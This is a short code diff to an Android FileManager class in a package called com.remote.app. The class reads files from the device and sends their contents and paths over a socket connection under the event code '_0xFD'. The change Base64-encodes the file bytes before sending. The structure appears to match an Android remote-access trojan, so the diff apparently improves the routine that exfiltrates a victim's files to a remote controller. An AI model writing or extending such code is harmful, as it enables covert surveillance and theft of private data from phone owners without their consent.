@@ -3,6 +3,7 @@ package com.remote.app;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.MediaStore;
+import android.util.Base64;
 import android.util.Log;
 
 import com.remote.app.socket.IOSocket;
@@ -114,9 +115,11 @@ public class FileManager {
 
                 object.put("path", file.getAbsolutePath());
 
-                object.put("buffer", data);
-                IOSocket.getInstance().getIoSocket().send("_0xFD", object);
+                object.put("buffer", Base64.encodeToString(data, Base64.DEFAULT));
+                IOSocket.getInstance().send("_0xFD", object.toString());
                 buf.close();
+
+
             } catch (FileNotFoundException e) {
                 e.printStackTrace();
             } catch (IOException e) {
